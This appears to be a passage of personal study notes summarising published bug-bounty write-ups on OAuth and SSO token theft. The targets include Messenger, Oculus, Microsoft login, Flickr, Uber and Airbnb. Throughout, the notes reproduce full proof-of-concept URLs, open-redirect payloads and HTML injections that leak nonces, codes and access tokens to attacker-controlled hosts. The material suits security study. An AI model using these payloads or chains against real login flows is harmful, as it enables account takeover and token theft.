    - Request URL: `www.messenger.com/login/nonce/`
    - Request header: `Cookie: datr=3GSyWAIGB6DhdUIQebUwj9Jg`
    - Request body: `userid=100011424732901&nonce=hFTzdP2Q&persistent=true&initial_request_id=A8eKoiVaTWx41Azk8IEwhvY&lsd=AVr7DyPv`
    - The same `datr` cookie that was used to generate the `identifier` and `initial_request_id` parameters is required in this POST request.
    - The endpoint uses the nonce to create a session and set cookies on `.messenger.com`.
  - When looking for flaws in a "nonce" base "login flow" where the "redirect URL" is controlled by a parameter, the first thing the author like to test is how strict it is on modifications to the "redirect URL".
    - In the case of the "Messenger website" the Facebook endpoint `https://www.facebook.com/login/messenger_dot_com_iframe/` contained a `redirect_uri` parameter which controlled where the "nonce" was redirected to.
    - The endpoint did not allow the path of the "redirect URL" (`/login/fb_iframe_target/`) to be changed or query string parameters to be added. However, `#` could be appended to the path (why did author add `?` or `#`).
    - Additionally, any `messenger.com` subdomain could be used.
  - When a "nonce" is delivered via a query string parameter in the redirect URL (`https://example.com/login/?secrect=nonce`) rather than as a hash fragment (`https://example.com/login/#secrect=nonce`), it's not required to actually redirect the nonce offsite in order to steal it. If you can get a URL containing the "nonce" set as the referrer before redirecting, you can extract it from the request.
    - So in this case in order to steal a "nonce", a way to redirect offsite was needed.
  - The "Messenger website" supported `#!/path` javascript redirects (When a `#!/path` was appended to a Messenger URL, javascript on the page would redirect to that path after the page was loaded).
    - Since the `https://www.facebook.com/login/messenger_dot_com_iframe/` endpoint allowed a hash to be appended to the redirect URL, it was possible to append a `#!/path` which would be redirected to after `https://www.messenger.com/login/fb_iframe_target/` was loaded.
  - The author knew that the "Messenger website" used the `/1.php` endpoint for redirecting to links.
    - Normally this endpoint uses javascript to remove the referrer before redirecting.
    - However, when redirecting to `www.facebook.com` links, just a "302 redirect" is used.
  - Through some Google searches, the author was able to find the Facebook endpoint `https://www.facebook.com/dialog/share_open_graph`. Given a "Facebook app ID" and the "redirect URL" set for the app, the endpoint would automatically redirect to the URL.
    - By creating a Facebook app and setting a redirect URL, it was possible to use the endpoint to redirect to any URL.
  - Combining these issues resulted in the URL: `https://www.facebook.com/login/messenger_dot_com_iframe/?redirect_uri=https%3A%2F%2Fwww.messenger.com%2Flogin%2Ffb_iframe_target%2F%3Finitial_request_id%3DA8eKoiVaTWx41Azk8IEwhvY%23!%2Fl.php%3Fu%3Dhttps%253A%252F%252Fwww.facebook.com%252Fdialog%252Fshare_open_graph%253Fapp_id%253D758283087524346%2526redirect_uri%253Dhttps%253A%252F%252Fstephensclafani.com%252Fpoc.php&identifier=ab66de64be75eef525f18b812e07b5d1&initial_request_id=A8eKoiVaTWx41Azk8IEwhvY`
    - This didn't work how the author expected. The "referrer" his PoC was receiving was `https://www.messenger.com/1.php`.
    - This was because every `www.messenger.com` page includes the meta tag: `<meta name="referrer" content="origin-when-crossorigin" id="meta_referrer" />`. This meta tag prevents the "referrer" from leaking data such as the "nonce" by setting the "referrer" to the origin (`https://www.messenger.com`) in cross-origin requests.
    - This would have been a game-over if not for the `https://www.facebook.com/login/messenger_dot_com_iframe/` endpoint allowing any `messenger.com` subdomain to be used in the "redirect URL".
  - Through a search on `crt.sh`, the author was able to find the subdomain `fb.beta.messenger.com`. This subdomain also included the "meta referrer tag" in its pages, however, it did not use the `origin-when-crossorigin` policy. So the final PoC URL: `https://www.facebook.com/login/messenger_dot_com_iframe/?redirect_uri=https%3A%2F%2Ffb.beta.messenger.com%2Flogin%2Ffb_iframe_target%2F%3Finitial_request_id%3DA8eKoiVaTWx41Azk8IEwhvY%23!%2Fl.php%3Fu%3Dhttps%253A%252F%252Fwww.facebook.com%252Fdialog%252Fshare_open_graph%253Fapp_id%253D758283087524346%2526redirect_uri%253Dhttps%253A%252F%252Fstephensclafani.com%252Fpoc.php&identifier=ab66de64be75eef525f18b812e07b5d1&initial_request_id=A8eKoiVaTWx41Azk8IEwhvY`
  - Fixed: Facebook's initial fix was to block the ability to add a hash to the redirect URL.
    - However, this fix could be bypassed with the following URL: `https://www.facebook.com/login/messenger_dot_com_iframe/?redirect_uri=https%3A%2F%2Ffb.beta.messenger.com%2Flogin%2Ffb_iframe_target%2F%3Finitial_request_id%3DA8eKoiVaTWx41Azk8IEwhvY&identifier=ab66de64be75eef525f18b812e07b5d1&initial_request_id=A8eKoiVaTWx41Azk8IEwhvY#!/l.php?u=https%3A%2F%2Fwww.facebook.com%2Fdialog%2Fshare_open_graph%3Fapp_id%3D758283087524346%26redirect_uri%3Dhttps%3A%2F%2Fstephensclafani.com%2Fpoc.php`
    - In this URL the `#!/l.php` is appended to the `https://www.facebook.com/login/messenger_dot_com_iframe/` endpoint URL.
    - This worked because modern browsers preserve an appended hash through a "302 redirect", even across sites. A hash appended to `https://www.facebook.com/login/messenger_dot_com_iframe/` gets appended to `https://fb.beta.messenger.com/login/fb_iframe_target/` after the redirect.
    - To prevent this a site can append its own hash to its redirects, this hash will replace any hash that's been appended to the parent URL.
- [Facebook: Bypass OAuth nonce and steal oculus response code](https://medium.com/@lokeshdlk77/bypass-oauth-nonce-and-steal-oculus-response-code-faa9cc8d0d37)
  - Facebook made a "OAuth login feature" for "Oculus", that meant the user could directly login to "Oculus" using Facebook account, but there was a `nonce` parameter in the URL that the author never seen in any other OAuth flow. So he started to dig deeper on it.
  - OAuth authorisation URL for "Facebook Oculus":
    - Request: `https://www.facebook.com/v2.8/dialog/oauth?app_id=1517832211847102&client_id=1517832211847102&domain=auth.oculus.com&locale=en_GB&origin=1&redirect_uri=https://auth.oculus.com/login/&response_type=code&sdk=joey&version=v2.8&nonce=AXRr8eBAjDTBkzQ7&state=d916afa3-3dc1-bab7-fc9d-3c8f44bf757`
    - Response: `https://auth.oculus.com/login/?code=AQDtxcP7I--AWqEvE-LjcPIjkimy7Z-oQHvLMtGNB8sdKSqhvvv5KFO1KNXgPw4nEewmFsOKsq1GIAcEqJq09rLHlsGQVBxq-HwqbvlE-_unfTayj2HdGp5GGEqsNLlK2zerCpKbBHbiDRW4tr7ZBnxcgebywDbd,lonbrqie5fdwjD-x6jsnI5wnZ4XaDIRMixFoRqtQSne406BwOo2nSVS2o1MmmXkLW_zaW5Vy0SW6&state=d916afa3-3dc1-bab8-fc9d-3c8f44bfe7b7#_=_`
  - The `nonce` acted as "CSRF token" to prevent the user from CSRF attack, if the `nonce` value is not matched, the OAuth request would get aborted and did not follow the `redirect_uri`. So this OAuth flow had two challenges:
    - Bypass `nonce`.
    - Bypass `redirect_uri`.
  - "CORS Proxy" is a free service for developers who need to bypass same-origin policy related to performing standard "AJAX requests" to 3rd party services (the author listed some online proxy servers).
  - When the author passed the OAuth URL in the "CORS Proxy" server, it responded the source code of the given URL. When he searched for "nonce" in the source code, he saw that both of the "nonce" value in "real request" and using this "cors request" are same. So he bypassed the `nonce`.
  - It's time to bypass `redirect_uri`. It made easy then he thought. The below URL redirected the response `code` to his app domain using "referer leakage":
    - `https://auth.oculus.com/login/?redirect_uri=https://www.facebook.com/dialog/send?client_id=1933886253534366&next=https://www.whatismyreferer.com&from_post=1&error_ok=OK`
  - Fixed: the leakage of "nonce" value in "CORS Proxy" and the `redirect_uri` in Oculus to Facebok was fixed.
  - The poc in this writeup is worth to study.
- [A tale about appengine.google.com authentication and life](https://proximasec.blogspot.com/2017/02/a-tale-about-appengines-authentication.html) by Andrey's Ramblings
  - `appengine.google.com` used to have a site attached to it, but it's been shutdown in favor of "Google Cloud". Anyway, the only function that this subdomain has is to authenticate users on third party domains. Except for some reason one subdomain on Google itself. To summarize, here are the sites that use this authentication:
    - Anything on `.withgoogle.com` domain, including the bug hunter dashboard.
    - `enterprise.google.com`, which is some sort of administration panel for "Gsuite accounts" and even "Google Partners".
    - `.appspot.com` sites, which are user generated.
  - I don't understand this writeup.
- [Obtaining Login Tokens for an Outlook, Office or Azure Account](https://whitton.io/articles/obtaining-tokens-outlook-office-azure-account/) by Jack Whitton
  - Microsoft has various services spread across multiple domains: `*.outlook.com`, `*.live.com`, and so on. To handle authentication across these services, requests are made to `login.live.com`, `login.microsoftonline.com`, and `login.windows.net` to get a session for the user.
    - User browsers to `https://outlook.office.com`.
    - User is redirected to `https://login.microsoftonline.com/login.srf?wa=wsignin1.0&rpsnv=4&wreply=https%3a%2f%2foutlook.office.com%2fowa%2f&id=260563`.
    - Provided that the user is logged in, a POST request is made back to the value of `wreply`, with the form field `t` containing a login "token" for the user.
    - The service then consumes the "token", and logs the user in.
  - Since the services are hosted on completely separate domains, and therefore cookies can't be used, the token is the only value needed to authenticate as a user. This is similar to how OAuth works.
    - What this means is that if we can get the above code to POST the value of `t` to a server we control, we can impersonate the user.
  - If we try and change the value of `wreply` to a non-Microsoft domain, such as `example.com`, we receive an error, and the request isn't processed.
    - One fun trick to play around with is URL-encoding parameters multiple times. Occassionally this can be used to bypass different filters.
  - The author uses `@example.com` to bypass URL filters, and redirects him to his own server.
    - The syntax of a URL: `scheme:[//[user:password@]host[:port]][/]path[?query][#fragment]`.
  - Fixed: the hostname in `wreply` must end in `%2f`, which get URL-decoded to `/`, this ensures that the browser only sends the request to the intended host.
- [Yahoo Bug Bounty: Chaining 3 Minor Issues To Takeover Flickr Accounts](https://mishresec.wordpress.com/2017/10/13/yahoo-bug-bounty-chaining-3-minor-issues-to-takeover-flickr-accounts/) by mishre
  - "Flickr" is an image and video hosting website which is owned by Yahoo and resides on the `flickr.com` domain. To handle authentication on "Flickr", requests are made to `login.yahoo.com` to get an "access token" for the user.
  - When a user wants to login to `flickr.com`, he clicks a "sign-in" button which redirects him to:
    - `https://login.yahoo.com/config/login?.src=flickrsignin&.pc=8190&.scrumb=0&.pd=c%3DH6T9XcS72e4mRnW3NpTAiU8ZkA–&.intl=il&.lang=en&mg=1&.done=https%3A%2F%2Flogin.yahoo.com%2Fconfig%2Fvalidate%3F.src%3Dflickrsignin%26.pc%3D8190%26.scrumb%3D0%26.pd%3Dc%253DJvVF95K62e6PzdPu7MBv2V8-%26.intl%3Dil%26.done%3Dhttps%253A%252F%252Fwww.flickr.com%252Fsignin%252Fyahoo%252F%253Fredir%253Dhttps%25253A%25252F%25252Fwww.flickr.com%25252F`.
    - This is the "Yahoo account login page" where a user is prompted to enter his credentials.
  - After completing the login form and clicking login, the user is first redirected to a "Yahoo endpoint" where his credentials are verified and then, if they are valid, he is redirected back to:
    - `https://www.flickr.com/signin/yahoo/?redir=https%3A%2F%2Fwww.flickr.com%2F&.data={first-token-value}&.ys={second-token-value}`
  - In the background "Flickr" verifies the `.ys` and `.data` parameters against the "Yahoo verification server" and logs the user in.
  - If a user is already logged in to Yahoo and clicks the initial link, the flow just happens in the background without the need for a user to enter his credentials in Yahoo.
    - This poses a higher risk of account takeover, due to the fact that the user just needs to click a single link (like in some "OAuth implementations") for the authentication to happen for him.
  - The first thing the author have noticed was that the second `.done` parameter can be manipulated. This parameter actually controled where the "login tokens" are sent. It appeared that Yahoo's servers only verify that it starts with `https://www.flickr.com/signin/yahoo/`, but we could still append `../`. So if we append `../../test` to the `.done` original value, the `.ys` and `.data` tokens would be sent to `https://www.flickr.com/test` endpoint.
    - This gave us a lead since if we found an "open redirect" somewhere on the `https://www.flickr.com/`, we would be able to send the "token" to our own server.
  - After some digging, the author came across `https://www.flickr.com/html.gne?tighten=0&type=comment`, which states that images can be embedded in the comments on different Flickr pages. He thought that maybe if he could post an external image in a comment, the "tokens" would be leaked to his own server via the "referrer filed".
    - Posted a comment on his own uploaded image: `<img src="https://attacker.com/someimage.jpg"&gt;`.
    - The image was really embeded in the comment, but unfortunately Yahoo were manipulating its `src` value to: `https://ec.yimg.com/ec?url=https://attacker.com/someimage.jpg&t=1491136241&sig=FGQiNHDOtEj7LQDBbYBnwA–~C`
    - That was actually an internal "Yahoo proxy" so that Flickr won't be leaking requests to external servers.
    - It appeared that if he used some browser tricks he could manipulate the Flickr image processing logic. Posted the comment: `<img src="\/\/www.attacker.com/someimage.jpg" />`
    - The comment was not manipulated by the proxy and the `src` value stayed as it was.
    - The browser accepted this as a valid URL, but there was some "CSP" applied, the `img-src` configuration blocked the image, so the author wasn't actually able to embed external images after all.
  - The author tried to look if there were other endpoints on Flickr that were also allowing comments. After some time, the came across the forums page: `https://www.flickr.com/help/forum/en-us/`. This page also supported the comments "html embedding feature", and more importantly it appeared that there was no "CSP" applied on all `https://www.flickr.com/help/forum/*` pages.
  - So final poc URL: `https://login.yahoo.com/config/validate?.src=flickrsignin&.pc=8190&.scrumb=cLI6NPLejY6&.scrumb2=GszxN7PzUWX&.pd=c%3DJvVF95K62e6PzdPu7MBv2V8-&.intl=il&.done=https%3A%2F%2Fwww.flickr.com%2Fsignin%2Fyahoo%2F..%2F..%2Fhelp%2Fforum%2Fen-us%2F72157668446997150%2Fpage14%2F`.
  - Resolution:
    - The `.done` parameter on the `login.yahoo.com` endpoint only allows `https://www.flickr.com/signin/yahoo/`.
    - The image embedding logic's bypass using `/\/\` is also fixed.
    - There is now "CSP" applied on the "Flickr forum".
- [Flickr ATO Fix Bypass](https://ngailong.wordpress.com/2017/08/07/flickr-ato-fix-bypass/) by Ron Chan
  - The author bypssed the previous vulnerability's fix.
  - Yahoo restricted the `redirect_uri` directory could only be `/signin/yahoo`.
    - If you do something like: `https://login.yahoo.com/config/validate?.src=flickrsignin&.pc=8190&.scrumb=&.pd=c%3DJvVF95K62e6PzdPu7MBv2V8-&.intl=hk&.done=https%3a%2f%2fwww.flickr.com%2Fsignin%2Fyahoo%2F..%2f..%2f%3Fredir%3Dhttps%253A%252F%252Fwww.flickr.com%252Fflickrrrrr&.crumb=`, there is no "access token" returned.
    - The directory is difficult to escaped, no more `../`.
  - However the payload behind "%3f" seems quite free to mess with, so the author appended a hash behind the URL.
    - `https://login.yahoo.com/config/validate?.src=flickrsignin&.pc=8190&.scrumb=&.pd=c%3DJvVF95K62e6PzdPu7MBv2V8-&.intl=hk&.done=https%3a%2f%2fwww.flickr.com%2Fsignin%2Fyahoo%2F%3Fredir%3Dhttps%253A%252F%252Fwww.flickr.com%252Fflickrrrrr%23&.crumb=`
    - The `%23` is decoded the `#` in the response.
    - `.data` is appended behind the hash.
    - This means, if he can find any "open redirect" in Flickr, then he can smuggle `.data` to attacker site.
  - "open redirect" in Flickr is not difficult to find as Yahoo does not accept "open redirect" as valid report.
    - `https://www.flickr.com/cookie_check.gne?pass=http://www.attacker.com#`
    - The "302 response" is: `http://www.attacker.com`
  - So the poc URL:
    - `https://login.yahoo.com/config/validate?.src=flickrsignin&.pc=8190&.scrumb=&.pd=c%3DJvVF95K62e6PzdPu7MBv2V8-&.intl=hk&.done=https%3a%2f%2fwww.flickr.com%2Fsignin%2Fyahoo%2F%3Fredir%3Dhttps%253A%252F%252Fwww.flickr.com%252Fcookie_check.gne%253fpass%253dhttp%253a%252f%252fattacker.com%2523&.crumb=`
- [One More Thing to Check for SSO – Flickr ATO](https://ngailong.wordpress.com/2017/08/29/one-more-thing-to-check-for-sso-flickr-ato/) by Ron Chan
  - The author has multiple "Yahoo accounts", at one point, he has "account A session" under `*.yahoo.com`, and has "account B session" under `*.flickr.com`, which is not his intended setup. Then he luckily browse to `https://www.flickr.com/login` base on browsing history in URL bar, and then the website said "You are logging in as ngalongc, are you switching your account to ronchan5?".
    - This page is interesting is not because its content, it is interesting because the URL of that page actually is storing the `.data` of user temporarily.
    - After some validation, the author confirm the `.data` could be reused. This is the point we need a "open redirect" and steal the URL by using referer technique.
  - The `pass` parameter is used for URL redirection, it has some whitelist validation in place to prevent "open redirect", but it coult be bypassed by the payload:
    - `https://www.flickr.com/cookie_check.gne?pass=https://www.flickr.com%252f@hackerone.com/yahoo`
  - However, victim needs to have exact same scenario as attacker, which is, they have "account A" autenticated in `*.yahoo.com` and "account B" authenticated in `*.flickr.com`. As this scenario is not that common for normal user, this would drastically decrease the security impact of the bug (always think the attack scenario!).
  - The author wanted to find a workaround to make it work across all user, so he kept observing the login flow. Finally he notice one simple fact that could turn this bug works universally: Flickr is vulnerable to "login CSRF".
    - We can first force victim to login "our Flickr account" while keeping "victim's yahoo session" intact, then send the explit payload to victim haver their payload stolen by using the "open redirect".
  - The poc in this writeup is worth to study.
- [Yahoo Bug Bounty: Exploiting OAuth Misconfiguration To Takeover Flickr Accounts](https://mishresec.wordpress.com/2017/10/12/yahoo-bug-bounty-exploiting-oauth-misconfiguration-to-takeover-flickr-accounts/) by mishre
  - Some time has passed since the author have tested "Flickr's login flow", so he have decided to take a look and see if something has changed. Surprisingly, he have noticed that Yahoo implemented the classic "OAuth login flow".
  - When a user wants to login to `flickr.com` he clicks a "sign-in" button which redirects him to:
    - `https://api.login.yahoo.com/oauth2/request_auth?client_id=dj0yJmk9NTJmMkVmOFo3RUVmJmQ9WVdrOVdXeGhVMWx3TjJFbWNHbzlNQS0tJnM9Y29uc3VtZXJzZWNyZXQmeD01OA–&redirect_uri=https%3A%2F%2Fwww.flickr.com%2Fsignin%2Fyahoo%2Foauth%2F%3Fredir%3Dhttps%253A%252F%252Fwww.flickr.com%252F%253Fytcheck%253D1%2526new_session%253D1&response_type=code&scope=openid%2Csdpp-w&nonce=bb1c92e088f38e9c323fe025d42c405f&.scrumb=jeTYmScEVYq`
  - If the user is not signed in to Yahoo, he is redirected to the "Yahoo login page" to enter his credentials and then back to the mentioned URL. What happens after arriving to the "OAuth endpoint" is that Yahoo generates a `code` to identify the logged in user, which is sent back to Flickr via another redirect:
    - `https://www.flickr.com/signin/yahoo/oauth/?redir=https://www.flickr.com/?ytcheck=1&new_session=1&code={redacted}`
  - What happens now is that in the background Flickr exchanges the `code` supplied by Yahoo for an "access token", and retrieves data about the user using this "access token".
  - While testing "Yahoo's OAuth implementation", the author came across the page `https://developer.yahoo.com/oauth2/guide/openid_connect/getting_started.html` stating that it's possible to set the `response_type` parameter to contain multiple values. So he decided to check what happens if he set the parameter to have the vaule: `code id_token`. Yahoo were appending both the `code` and the `id_token` to the fragment part of the URL, redirecting him to:
    - `https://www.flickr.com/signin/yahoo/oauth/?redir=https://www.flickr.com/?ytcheck=1&new_session=1#code={redacted}&id_token={redacted}`
    - The fragment part of the URL (everything after `#`) is preserved when handling redirect responses from the server. So using this minor issue, we could potentially leak a victim's `code` parameter to anywhere the `redir` parameter points to.
  - Flickr only performs the redirect if a valid `code` is passed to the server via the query string. So, for an attacker to be able to leak the code, he actually needs to generate a `code` using his own account and then send it as part of the `redirect_uri` URL (how did the author find out this feature?).
  - Yahoo correctly verified that the URL is of the form: `https://www.flickr.com/*`. This means that we need to find an "open redirect" on `flickr.com` in order to leak the authentication `code` to an attacker's domain. The author was finally able to find such a redirect after downloading the "Flickr android application". He noticed that if the wrong `token` value is passed to a social sharing endpoint (available though the Flickr app and not available via the website), a redirect is performed to the `callback_url` parameter:
    - `https://www.flickr.com/sharing_connect.gne?service_type_id=9&token=a&callback_url=https%3A%2F%2F%2Fgoogle.com%2F`
  - Attack flow: an attacker generates a Flickr authentication `code` for his own test account, he then constructs the following URL to send to the victim:
    - `https://api.login.yahoo.com/oauth2/request_auth?client_id=dj0yJmk9NTJmMkVmOFo3RUVmJmQ9WVdrOVdXeGhVMWx3TjJFbWNHbzlNQS0tJnM9Y29uc3VtZXJzZWNyZXQmeD01OA–&redirect_uri=https%3A%2F%2Fwww.flickr.com%2Fsignin%2Fyahoo%2Foauth%2F%3Fcode%3D{here-is-the-attacker’s-code}%26redir%3Dhttps%253A%252F%252Fwww.flickr.com%252Fsharing_connect.gne%253Fservice_type_id%253D9%2526token%253Da%2526callback_url%253Dhttps%25253A%25252F%25252F%25252Fattacker.com%25252F&response_type=code id_token&scope=openid%2Csdpp-w&nonce=bb1c92e088f38e9c323fe025d42c405f&.scrumb=jeTYmScEVYq`
- [Login CSRF + Open Redirect = Uber Account Take Over](https://ngailong.wordpress.com/2017/08/07/uber-login-csrf-open-redirect-account-takeover/) by Ron Chan
  - This bug was in `central.uber.com`, it used "OAuth" as login mechanism, however the "CSRF" parameter is not used correctly, which allowed attacker to take advantage of the misused `state` parameter to perform "open redirect" and "login CSRF", then steal the "access token" in URL hash after redirect.
  - When user pressed "login" in `central.uber.com`, it went like:
    - `https://central.uber.com/login?state=/somewhere`
    - `https://login.uber.com/oauth/authorize?response_type=code&scope=profile%20history&client_id=bOYt8vYWpnAacUZt9ng2LILDXnV-BAj4&redirect_uri=https%3A%2F%2Fcentral.uber.com%2Foauth2-callback&state=%2Fsomewhere`
    - `https://central.uber.com/oauth2-callback?state=%2F&code=it53JtFe6BPGH1arCLxQ6InrT4MXdd`
    - `https://central.uber.com/somewhere`
  - The author changed the `state` value from `/somwhere` to `//google.com` to get a potential "open redirect", the flow went like:
    - `https://central.uber.com/login?state=//google.com`
    - `https://login.uber.com/oauth/authorize?response_type=code&scope=profile%20history&client_id=bOYt8vYWpnAacUZt9ng2LILDXnV-BAj4&redirect_uri=https%3A%2F%2Fcentral.uber.com%2Foauth2-callback&state=%2F%2fgoogle.com`
    - `https://central.uber.com/oauth2-callback?state=%2F%2fgoogle.com&code=it53JtFe6BPGH1arCLxQ6InrT4MXdd`
    - `//google.com`
  - Since the "OAuth request" was using `code` instead of `token`, so even with "open redirect", we couldn't steal anything from this flow. So changed the request from `code` to `token`:
    - `https://login.uber.com/oauth/authorize?response_type=token&scope=profile%20history&client_id=bOYt8vYWpnAacUZt9ng2LILDXnV-BAj4&redirect_uri=https%3A%2F%2Fcentral.uber.com%2Foauth2-callback&state=%2F%2fgoogle.com`
    - `https://central.uber.com/oauth2-callback?state=%2F%2fgoogle.com#access_token=xxxxx`
    - No redirect here.
    - Because there was no valid `code` value for `https://central.uber.com/oauth2-callback`, so that there was no "open redirect" after step 2.
    - We needed a workaround, we needed a valid `code` for that `oauth2-callback` endpoint.
  - This moment was the perfect moment for "login CSRF" to take advantage in moment like this, since the CSRF parameter `state` was used as redirect purpose, we could just simply put out attacker's own valid OAuth `code` to the endpoint `oauth2-callback`, and sent that to victim, so victim would correctly redirect to attacker controlled page with the leaked "access token".
  - PoC URL: `https://login.uber.com/oauth/authorize?response_type=token&scope=profile%20history%20places%20ride_widgets%20request%20request_receipt%20all_trips&client_id=bOYt8vYWpnAacUZt9ng2LILDXnV-BAj4&redirect_uri=https%3A%2F%2Fcentral.uber.com%2Foauth2-callback%3fcode%3d{attacker_valid_oauth_code}&state=%2F%2fhackerone.com`
- [Uber - redirect_uri is difficult to do it right](https://ngailong.wordpress.com/2017/11/22/uber-redirect_uri-is-difficult-to-do-it-right/) by Ron Chan
  - The author didn't have automation in his bug hunting, no "sqlmap", "sublist3r" or "jsparser". He tried, they just didn't work out for him. Other than a "VPS server" that help him to brute force certain endpoints to make a poc occasionall, all he have is a "Burp Pro license" on MBP.
  - `site:uber.com`, `site:uberinternal.com`, `site:yahoo.com` is his hobby, looking through 15K of requests per day in Burp is daily job. Not going after "reflective XSS" or "stored XSS" except it's right in his face. Test where the site leads him, check 10 variations of `redirect_uri` if the site use "OAuth". Most of his findings are irregular and spontaneous.
  - Uber allowed "Facebook login" in both `login.uber.com` and `auth.uber.com`, when we click "login with Facebook" button on the page, the flow:
    - `https://facebook.com/xxxx?client_id=xxxxxx&redirect_uri=https%3a%2f%2fauth.uber.com%2flogin%3fnext_url=https%3A%2F%2Frush.uber.com%2Flogin%2F&state=m7QWxxPRNII4VGsCSog0xLJ2KF7e8ynpC2c_OAKkQQk%3D`
    - `https://auth.uber.com/login?next_url=https%3A%2F%2Frush.uber.com%2Flogin%2F&state=m7QWxxPRNII4VGsCSog0xLJ2KF7e8ynpC2c_OAKkQQk%3D#access_toekn=xxxx`
    - `https://rush.uber.com/login?&#8230;.#access_token=xxxx`
  - "login endpoint" allowed further redirect to `*.uber.com`. So if it is possible to find "open redirect" in the `next_url` parameter, and redirect user to `*.uber.com` then to attacker controlled site, then we are able to steal the access token in URL.
    - Cause Uber is not accepting "open redirect" as valid submission anymore, finding one is not that difficult. One "open redirect" that still work is `https://login.uber.com/logout`, it redirects base on "referer header".
  - PoC: `<a href="https://facebook.com/xxxx?client_id=xxxxxx&redirect_uri=https%3a%2f%2fauth.uber.com%2flogin%3fnext_url=https%3A%2F%2Flogin.uber.com%2Flogout%2F&state=state">Click to leak</a>alert(location.hash)`
  - After Uber fixed this issue, the author figured Uber "FB login" is still hosting two whitelisted `redirect_uri`: `https://auth.uber.com/login` and `https://login.uber.com/login`. In theory, these should be difficult to exploit against since they have already patched the bug of "open redirect", there is no way for the author to redirect user to `https://login.uber.com/logout` again.
  - The author explored Facebook `redirect_uri`, if `https://www.example.com/directory` is whitelisted URL, then the variety of `redirect_uri` should be:
    - `redirect_uri=https%3a%2f%2fwww.example.com%2fdirectory`, passed.
    - `redirect_uri=https%3a%2f%2fwww.example.com%2fdirectory%3fparameter%3dvalue`, passed.
    - `redirect_uri=https%3a%2f%2fwww.example.com%2fdirectory%3fparameter%3dvalue%23`, failed, since `%23` in the end of URL.
    - `redirect_uri=https%3a%2f%2fwww.example.com%2fdirectory%2f..%2f..%2f`, failed, since it is using `../` to escape directory.
    - `redirect_uri=https%3a%2f%2fwww.example.com%2fdirectory%252f..%252f..%252fescaped`, passed!!!
  - This is the time to see whether the server accept the encoded slash `%2f`. Usually the server will not accept this and return "400 forbidden" or "404 not found". But `login.uber.com` happily accepted this as normalised directory in server side:
    - `https://login.uber.com/login`, present "login page".
    - `https://login.uber.com/logout`, present "logout page".
    - `https://login.uber.com/login%2f..%2f..%2flogout`, present "logout page".
  - PoC: `<a href="https://facebook.com/xxxx?client_id=xxxxxx&redirect_uri=https%3a%2f%2flogin.uber.com%2flogin%252f..%252f..%252flogout&state=state">Click to leak</a>alert(location.hash)`
  - Fixed: removed `login.uber.com` as the whitelist `redirect_uri`.
- [Authentication bypass on Airbnb via OAuth tokens theft](https://www.arneswinnen.net/2017/06/authentication-bypass-on-airbnb-via-oauth-tokens-theft/) by Arne Swinnen
  - Most publicly available examples of "OAuth token theft" attacks rely on modification of the `redirect_uri` parameter value in the call to an "identity provider" in order to steal either an `authorization code` or an `access_token` from an authenticated victim. This requires a non-exact match of `redirect_uri` configured vaules (e.g. wildcards for subdomains or paths in the URL) for the "service provider's application" on the "identify provider" end. Although the attacks are similar, their associated technique and impact is different:
    - `authorization code`: Typically stolen via cross-domain leakage of the callback URL, which contains the precious authorization `code` GET parameter value that is appended the `redirect_uri` URL by the "identity provider" upon redirection. Impact is typically authentication bypass on the "service provider" end, as the stolen `code` can be used to login as the victim there.
    - `access_token`: Typically stolen via a cross-domain "open redirect" chain, since the `access_token` is communicated back via an URL's location fragment (location.hash) by the "identity provider", which survives cross-domain server-side redirects in all modern browsers. Impact is typically access to the victim's "identity provider" with permissions of the "service provider's application".
  - "login CSRF" in combination with an "HTTP referer header based open redirect" in "Airbnb's OAuth login flow", could be abused to steal "OAuth access tokens" of all Airbnb "identity providers" and eventually authenticate as the victim on Airbnb's website and mobile application.
    - This attack did not rely on a specific OAuth "identify provider" app configuration flaw (e.g. wildcards in whitelisted `redirect_uri` URLs), which made it generic for all Airbnb's "identity providers".
  - If an unauthenticated user browsed to a page on `www.airbnb.com` that required authentication (e.g. `https://www.airbnb.com/user/edit`), he / she was redirected to teh "login page". However, after successfully logging in, the user was automatically redirected back to the original page he / she requested initially. This functionality was implemented through Airbnb's `redirect_params` controller, which was not found vulnerable for external "open redirect" vulnerabilities.
  - However, if the user was already logged into Airbnb when returning from an "identity provider", the `oauth_callback` endpoint would automatically redirect the user based on the "HTTP referer header" in the initiating OAuth login call to `/oauth_connect`. The "HTTP referer header" could be controlled by an attacker by design.
  - If an attacker wants to exploit this, he / she must achieve three additional things: forge a request to the vulnerable endpoint with an arbitrary "HTTP referer header" while being authenticated to Airbnb and get some sensitive data such as "OAuth tokens" in the URL to effectively steal something useful.
  - The OAuth authorization `code` value, which is communicated back in GET parameters to the Airbnb endpoint by Facebook & Google, gets lost during the redirections. However, both "identity providers" also offer communication of `access_tokens` via an "URL fragment" (the part after a hashtag in a URL) as opposed to URL parameters.
    - "URL fragment" only exits on the client side and are properly preserved by the browser during redirects and accessible from Javascript, even by then last page in the "redirection chain" which is on a completely different origin.
  - However, there are some additional problems:
    - If we want to retrieve "URL fragments" from the "identity providers" to steal later on, we must be able to modify the OAuth request call to the provider (add `token` to the `response_type` parameter). However, this request is sent only after the initiating call to Airbnb OAuth endpoint `https://www.airbnb.cat/oauth_connect` in which the "open redirect via HTTP referer header exists", which is necessary for the overall attack.
    - Airbnb's callback endpoint expects an authorization `code` via a URL GET parameter from the "identity provider". However, when receiving a "URL fragment" instead, it will consider the authentication attempt invalid and hen not perform the final redirect, since we are not logged in.
  - These two issues were both solved by exploiting a "login CSRF" vulnerability via the same OAuth endpoint, as an "OAuth login" is initiated via a forgeable GET call to `https://www.airbnb.cat/oauth_connect`. An attacker first transparently logs in his / her victim unkowningly to their own "Airbnb account" via an "identity provider", hereby planting the redirection seed via the "HTTP referer header". Now the victim is authenticated to Airbnb.
    - Note that there was proper "OAuth CSRF protection" in place (`state` parameter), but since we are authenticating the victim into his / her own account, this doesn't prevent anything here.
  - Now, when the attacker again forces the victim to make an additional Login via  Facebook / Google but with `response_type` `code,token` as opposed to the normal `code`, the redirection flow of earlier will still work. Concretely, since we are still logged in, a redirect to the arbitrary "HTTP referer header" planted earlier will occur, this time with the "URL fragments" containing the victim's identity provider "OAuth tokens".
  - An attacker now gained two things:
    - `code`, which can be used to authenticate to `airbnb.com` as the victim. This is because the `redirect_uri` has not been changed during our attack, we only changed the communication of it from a GET parameter to an "URL fragment".
    - `access_token`, which can be used to query information of the victim at the "indentity provider" and authenticated as the victim user on the Airbnb mobile application.
  - The Poc in this writeup is worth to study.
